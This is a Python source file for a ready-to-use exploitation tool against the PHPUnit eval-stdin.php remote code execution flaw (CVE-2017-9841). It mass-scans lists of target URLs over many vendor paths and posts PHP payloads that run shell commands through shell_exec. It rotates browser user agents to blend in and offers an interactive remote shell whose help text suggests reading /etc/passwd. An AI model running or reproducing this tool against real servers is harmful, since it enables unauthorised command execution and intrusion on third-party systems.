import os
import re
import urllib3
import argparse
import requests
import time
import random
import sys
from typing import List, Dict, Tuple, Optional
from urllib.parse import urlparse

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from alive_progress import alive_bar
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from concurrent.futures import ThreadPoolExecutor, as_completed


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class VulnerabilityScanner:
    def __init__(self, threads=10, timeout=8):
        self.console = Console()
        self.threads = threads
        self.timeout = timeout
        
        # User agents untuk rotasi
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        ]
        
        # Paths untuk PHPUnit RCE
        self.vulnerable_paths = [
            "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/system/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/backend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/symfony/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/staging/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        ]
        
        # Patterns untuk validasi output
        self.valid_patterns = [
            # Linux/Unix id command output
            r'uid=\d+\(\w+\)\s+gid=\d+\(\w+\)\s+groups=\d+\(\w+\)',
            r'uid=\d+\(\w+\)\s+gid=\d+\(\w+\)',
            r'^uid=\d+',
            r'^gid=\d+',
            
            # whoami output (single word)
            r'^[a-zA-Z0-9_-]{1,32}$',
            
            # pwd output (path)
            r'^/[a-zA-Z0-9_./-]+$',
            
            # uname output
            r'^Linux$',
            r'^Darwin$',
            r'^Windows$',
        ]
        
        # False positive patterns
        self.fp_patterns = [
            r'<!DOCTYPE\s+html',
            r'<html[^>]*>',
            r'<head[^>]*>',
            r'<body[^>]*>',
            r'<script[^>]*>',
            r'<style[^>]*>',
            r'\.css["\']',
            r'\.js["\']',
            r'function\s*\(',
            r'const\s+\w+\s*=',
            r'let\s+\w+\s*=',
            r'var\s+\w+\s*=',
            r'class="',
            r'id="',
            r'404\s+Not\s+Found',
            r'403\s+Forbidden',
            r'500\s+Internal',
            r'Error\s+\d+',
        ]
        
        # Session untuk maintain cookies
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })

    def _rotate_user_agent(self):
        """Rotate user agent"""
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents)
        })

    def _validate_output(self, output: str) -> Tuple[bool, str]:
        """Validate if output looks like real command output"""
        if not output or output.isspace():
            return False, "Empty output"
        
        # Cek panjang (command output biasanya < 500 chars)
        if len(output) > 500:
            return False, f"Too long ({len(output)} chars)"
        
        # Cek false positives
        for pattern in self.fp_patterns:
            if re.search(pattern, output, re.IGNORECASE):
                return False, f"False positive: {pattern}"
        
        # Cek valid patterns
        for pattern in self.valid_patterns:
            if re.search(pattern, output, re.IGNORECASE):
                return True, f"Valid pattern: {pattern}"
        
        # Additional checks
        # Command output biasanya tidak banyak HTML tags
        html_tags = re.findall(r'<[^>]+>', output)
        if len(html_tags) > 2:
            return False, f"Too many HTML tags ({len(html_tags)})"
        
        # Check if looks like JavaScript/CSS
        lines = output.split('\n')
        if len(lines) > 10:  # Command output biasanya pendek
            return False, "Too many lines"
        
        return False, "No valid patterns matched"

    def _test_path(self, target: str, path: str) -> Tuple[bool, str, str]:
        """Test specific path for vulnerability"""
        url = target.rstrip('/') + path
        
        # Rotate user agent
        self._rotate_user_agent()
        
        # Generate unique markers
        marker_start = f"START_{random.randint(1000, 9999)}"
        marker_end = f"END_{random.randint(1000, 9999)}"
        payload = f"<?php echo '{marker_start}'; echo(shell_exec('id')); echo '{marker_end}'; ?>"
        
        try:
            start_time = time.time()
            
            response = self.session.post(
                url,
                data=payload,
                timeout=self.timeout,
                allow_redirects=False
            )
            
            response_time = time.time() - start_time
            
            # Check status code
            if response.status_code not in [200, 500]:
                return False, url, f"Status {response.status_code}"
            
            # Check content length (too small might be error page)
            if len(response.text) < 50 and response.status_code == 200:
                return False, url, "Response too short"
            
            # Extract output between markers
            pattern = f"{marker_start}(.*?){marker_end}"
            match = re.search(pattern, response.text, re.DOTALL)
            
            if match:
                output = match.group(1).strip()
                
                # Validate output
                is_valid, reason = self._validate_output(output)
                
                if is_valid:
                    return True, url, output
                else:
                    return False, url, f"Invalid output: {reason}"
            
            # Check if file exists but maybe sanitized
            elif "eval-stdin.php" in response.text or "eval()" in response.text:
                return False, url, "File exists but sanitized"
            
            # Check for common error pages
            elif any(error in response.text.lower() for error in ['not found', '404', 'forbidden', '403']):
                return False, url, "Page not found/forbidden"
            
            else:
                return False, url, "No markers found in response"
                
        except requests.exceptions.ConnectionError:
            return False, url, "Connection failed"
        except requests.exceptions.Timeout:
            return False, url, "Timeout"
        except requests.exceptions.TooManyRedirects:
            return False, url, "Too many redirects"
        except Exception as e:
            return False, url, f"Error: {str(e)[:50]}"
    
    def _test_multiple_commands(self, url: str) -> List[Dict]:
        """Test multiple commands to confirm RCE"""
        commands = [
            ('id', 'id'),
            ('whoami', 'whoami'),
            ('pwd', 'pwd'),
            ('uname -a', 'uname'),
            ('echo PHPUNIT_TEST', 'echo'),
        ]
        
        results = []
        
        for cmd_name, cmd in commands:
            marker_start = f"CMD_{random.randint(10000, 99999)}"
            marker_end = f"END_{random.randint(10000, 99999)}"
            payload = f"<?php echo '{marker_start}'; echo(shell_exec('{cmd}')); echo '{marker_end}'; ?>"
            
            try:
                self._rotate_user_agent()
                response = self.session.post(
                    url,
                    data=payload,
                    timeout=self.timeout,
                    allow_redirects=False
                )
                
                pattern = f"{marker_start}(.*?){marker_end}"
                match = re.search(pattern, response.text, re.DOTALL)
                
                if match:
                    output = match.group(1).strip()
                    is_valid, reason = self._validate_output(output)
                    
                    results.append({
                        'command': cmd,
                        'output': output,
                        'valid': is_valid,
                        'reason': reason,
                        'status': response.status_code,
                        'length': len(response.text)
                    })
                else:
                    results.append({
                        'command': cmd,
                        'output': '',
                        'valid': False,
                        'reason': 'No output markers',
                        'status': response.status_code,
                        'length': len(response.text)
                    })
                    
                # Small delay between commands
                time.sleep(0.5)
                
            except Exception as e:
                results.append({
                    'command': cmd,
                    'output': '',
                    'valid': False,
                    'reason': f"Error: {str(e)[:50]}",
                    'status': 0,
                    'length': 0
                })
        
        return results

    def scan_target(self, target: str, verbose: bool = False) -> List[Dict]:
        """Scan single target with multiple paths"""
        target = target.rstrip('/')
        vulnerabilities = []
        
        if verbose:
            self.console.print(f"[cyan][*] Scanning: {target}[/cyan]")
        
        for path in self.vulnerable_paths:
            is_vuln, url, message = self._test_path(target, path)
            
            if verbose:
                status = "[green]✓[/green]" if is_vuln else "[red]✗[/red]"
                self.console.print(f"  {status} {path} - {message}")
            
            if is_vuln:
                # Test multiple commands to confirm
                command_results = self._test_multiple_commands(url)
                valid_commands = [r for r in command_results if r['valid']]
                
                if valid_commands:
                    vulnerabilities.append({
                        'target': target,
                        'path': path,
                        'url': url,
                        'commands': valid_commands,
                        'all_results': command_results,
                        'confirmed': True
                    })
                    
                    if verbose:
                        self.console.print(f"[bold green][+] CONFIRMED: {url}[/bold green]")
                        for cmd in valid_commands[:2]:  # Show first 2 commands
                            self.console.print(f"  [yellow]{cmd['command']}:[/yellow] {cmd['output']}")
                    
                    break  # Stop after first valid path
                else:
                    # Potential vulnerability
                    vulnerabilities.append({
                        'target': target,
                        'path': path,
                        'url': url,
                        'commands': command_results,
                        'confirmed': False
                    })
        
        return vulnerabilities

    def exploit(self, target: str, command: str = "id", verbose: bool = False) -> Tuple[Optional[str], Optional[str]]:
        """Exploit specific target with custom command"""
        # First find vulnerable path
        vulns = self.scan_target(target, verbose=False)
        
        if not vulns or not any(v.get('confirmed') for v in vulns):
            if verbose:
                self.console.print("[bold red][!] Target not vulnerable[/bold red]")
            return None, None
        
        # Get confirmed vulnerable URL
        vulnerable_url = next(v['url'] for v in vulns if v.get('confirmed'))
        
        # Execute custom command
        marker_start = f"EXPLOIT_{random.randint(100000, 999999)}"
        marker_end = f"FINISH_{random.randint(100000, 999999)}"
        payload = f"<?php echo '{marker_start}'; echo(shell_exec('{command}')); echo '{marker_end}'; ?>"
        
        try:
            self._rotate_user_agent()
            response = self.session.post(
                vulnerable_url,
                data=payload,
                timeout=self.timeout,
                allow_redirects=False
            )
            
            pattern = f"{marker_start}(.*?){marker_end}"
            match = re.search(pattern, response.text, re.DOTALL)
            
            if match:
                output = match.group(1).strip()
                
                if verbose:
                    self.console.print(Panel(
                        output,
                        title=f"[bold green]Command Output[/bold green]",
                        border_style="green"
                    ))
                else:
                    self.console.print(f"[bold green][+] {vulnerable_url}[/bold green]")
                    self.console.print(f"[yellow]Command:[/yellow] {command}")
                    self.console.print(f"[cyan]Output:[/cyan]\n{output}\n")
                
                return vulnerable_url, output
            
            else:
                if verbose:
                    self.console.print("[bold red][!] No output captured[/bold red]")
                
        except Exception as e:
            if verbose:
                self.console.print(f"[bold red][!] Error: {e}[/bold red]")
        
        return None, None

    def interactive_shell(self, target: str):
        """Interactive shell mode"""
        self.console.print(Panel(
            f"[bold cyan]Interactive Shell Mode[/bold cyan]\nTarget: {target}",
            border_style="cyan"
        ))
        
        # Check if vulnerable
        vulns = self.scan_target(target, verbose=True)
        
        if not vulns or not any(v.get('confirmed') for v in vulns):
            self.console.print("[yellow][!] Target may not be vulnerable[/yellow]")
            self.console.print("[yellow][!] You can still try commands[/yellow]")
            vulnerable_url = None
        else:
            vulnerable_url = next(v['url'] for v in vulns if v.get('confirmed'))
            self.console.print(f"[green][+] Vulnerable URL: {vulnerable_url}[/green]")
        
        session = PromptSession(history=InMemoryHistory())
        
        while True:
            try:
                cmd = session.prompt(HTML('<ansired><b>shell&gt; </b></ansired>'))
                
                if cmd.lower() in ['exit', 'quit', 'q']:
                    self.console.print("[yellow][!] Exiting...[/yellow]")
                    break
                elif cmd.lower() == 'clear':
                    os.system('clear' if os.name == 'posix' else 'cls')
                    continue
                elif cmd.lower() == 'help':
                    self._show_help()
                    continue
                elif not cmd.strip():
                    continue
                
                # If we don't have a vulnerable URL, try to find one
                if not vulnerable_url:
                    # Try to exploit with this command to test
                    url, output = self.exploit(target, cmd, verbose=True)
                    if url:
                        vulnerable_url = url
                else:
                    # Use known vulnerable URL
                    marker = f"CMD_{random.randint(1000000, 9999999)}"
                    payload = f"<?php echo '{marker}'; echo(shell_exec('{cmd}')); echo '{marker}'; ?>"
                    
                    try:
                        response = self.session.post(
                            vulnerable_url,
                            data=payload,
                            timeout=self.timeout
                        )
                        
                        pattern = f"{marker}(.*?){marker}"
                        match = re.search(pattern, response.text, re.DOTALL)
                        
                        if match:
                            output = match.group(1).strip()
                            if output:
                                self.console.print(f"\n[cyan]{output}[/cyan]\n")
                            else:
                                self.console.print("[yellow]Command executed (no output)[/yellow]")
                        else:
                            self.console.print("[red]Failed to get output[/red]")
                    
                    except Exception as e:
                        self.console.print(f"[red]Error: {e}[/red]")
                
            except KeyboardInterrupt:
                self.console.print("\n[yellow][!] Exiting...[/yellow]")
                break
    
    def _show_help(self):
        """Show help for interactive shell"""
        help_text = """
        [bold]Available Commands:[/bold]
        • exit/quit/q      - Exit shell
        • clear           - Clear screen
        • help            - Show this help
        • [command]       - Execute shell command
        
        [bold]Example Commands:[/bold]
        • id              - Show user info
        • whoami          - Show current user
        • pwd             - Show current directory
        • ls -la          - List files
        • cat /etc/passwd - Read system file
        • uname -a        - System info
        """
        self.console.print(Panel(help_text, title="Help", border_style="blue"))

    def scan_from_file(self, filename: str, output_file: Optional[str] = None):
        """Scan multiple targets from file"""
        try:
            with open(filename, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            self.console.print(f"[red][!] Error reading file: {e}[/red]")
            return
        
        if not targets:
            self.console.print("[red][!] No targets found in file[/red]")
            return
        
        self.console.print(f"[cyan][*] Scanning [bold]{len(targets)}[/bold] targets...[/cyan]")
        
        all_vulnerabilities = []
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            with alive_bar(len(targets), title="Scanning", bar='smooth', spinner='dots') as bar:
                future_to_target = {executor.submit(self.scan_target, target): target for target in targets}
                
                for future in as_completed(future_to_target):
                    target = future_to_target[future]
                    try:
                        result = future.result(timeout=20)
                        if result:
                            all_vulnerabilities.extend(result)
                    except Exception as e:
                        self.console.print(f"[dim][!] Error scanning {target}: {e}[/dim]")
                    finally:
                        bar()
        
        self._display_results(all_vulnerabilities, output_file)
    
    def _display_results(self, vulnerabilities: List[Dict], output_file: Optional[str] = None):
        """Display scan results"""
        if not vulnerabilities:
            self.console.print(Panel(
                "[bold red]No vulnerable targets found[/bold red]",
                title="Scan Results",
                border_style="red"
            ))
            return
        
        confirmed = [v for v in vulnerabilities if v.get('confirmed')]
        potential = [v for v in vulnerabilities if not v.get('confirmed')]
        
        # Display confirmed vulnerabilities
        if confirmed:
            table = Table(title="[bold green]CONFIRMED VULNERABLE TARGETS[/bold green]")
            table.add_column("No.", style="cyan")
            table.add_column("Target", style="magenta")
            table.add_column("URL", style="green")
            table.add_column("Commands", style="yellow")
            
            for i, vuln in enumerate(confirmed, 1):
                cmd_outputs = []
                for cmd in vuln['commands'][:2]:  # Show first 2 commands
                    cmd_outputs.append(f"{cmd['command']}: {cmd['output'][:50]}...")
                
                table.add_row(
                    str(i),
                    vuln['target'],
                    vuln['url'],
                    "\n".join(cmd_outputs)
                )
            
            self.console.print(table)
        
        # Display potential vulnerabilities
        if potential:
            self.console.print("\n[yellow][?] POTENTIAL TARGETS (needs verification):[/yellow]")
            for vuln in potential[:10]:  # Show only first 10
                self.console.print(f"  [dim]{vuln['url']}[/dim]")
            
            if len(potential) > 10:
                self.console.print(f"  [dim]... and {len(potential) - 10} more[/dim]")
        
        # Save to file if requested
        if output_file:
            self._save_results(confirmed, potential, output_file)
    
    def _save_results(self, confirmed: List[Dict], potential: List[Dict], filename: str):
        """Save results to file"""
        try:
            with open(filename, 'w') as f:
                if confirmed:
                    f.write("=" * 80 + "\n")
                    f.write("CONFIRMED VULNERABLE TARGETS\n")
                    f.write("=" * 80 + "\n\n")
                    
                    for vuln in confirmed:
                        f.write(f"Target: {vuln['target']}\n")
                        f.write(f"URL: {vuln['url']}\n")
                        f.write(f"Path: {vuln['path']}\n\n")
                        
                        f.write("Command Results:\n")
                        for cmd in vuln['commands']:
                            f.write(f"  {cmd['command']}: {cmd['output']}\n")
                        
                        f.write("\n" + "-" * 60 + "\n\n")
                
                if potential:
                    f.write("=" * 80 + "\n")
                    f.write("POTENTIAL TARGETS\n")
                    f.write("=" * 80 + "\n\n")
                    
                    for vuln in potential:
                        f.write(f"URL: {vuln['url']}\n")
                        if vuln.get('commands'):
                            for cmd in vuln['commands'][:1]:
                                f.write(f"  Response: {cmd['output'][:100]}...\n")
                        f.write("\n")
            
            self.console.print(f"[green][*] Results saved to [bold]{filename}[/bold][/green]")
        
        except Exception as e:
            self.console.print(f"[red][!] Error saving results: {e}[/red]")


def main():
    parser = argparse.ArgumentParser(
        description="[bold cyan]PHPUnit RCE Scanner (CVE-2017-9841)[/bold cyan]",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -f targets.txt -o results.txt
  %(prog)s -u https://example.com -i
  %(prog)s -u https://example.com -v
  %(prog)s -f urls.txt -t 20 -v
        """
    )
    
    parser.add_argument("-f", "--file", help="File containing list of URLs to scan")
    parser.add_argument("-u", "--url", help="Single target URL")
    parser.add_argument("-o", "--output", help="Output file for results")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("-i", "--interactive", action="store_true", help="Interactive shell mode")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--timeout", type=int, default=8, help="Request timeout in seconds (default: 8)")
    
    args = parser.parse_args()
    
    console = Console()
    
    # Print banner
    console.print(Panel(
        "[bold cyan]PHPUnit RCE Scanner[/bold cyan]\n"
        "[dim]CVE-2017-9841 - eval-stdin.php Vulnerability[/dim]",
        border_style="cyan"
    ))
    
    scanner = VulnerabilityScanner(threads=args.threads, timeout=args.timeout)
    
    try:
        if args.url:
            if args.interactive:
                scanner.interactive_shell(args.url)
            else:
                vulns = scanner.scan_target(args.url, verbose=args.verbose)
                if not vulns:
                    console.print("[red][!] Target is not vulnerable[/red]")
        
        elif args.file:
            scanner.scan_from_file(args.file, args.output)
        
        else:
            console.print("[red][!] Error: Specify either -u URL or -f FILE[/red]")
            parser.print_help()
    
    except KeyboardInterrupt:
        console.print("\n[yellow][!] Scan interrupted by user[/yellow]")
    except Exception as e:
        console.print(f"[red][!] Fatal error: {e}[/red]")


if __name__ == "__main__":
    main()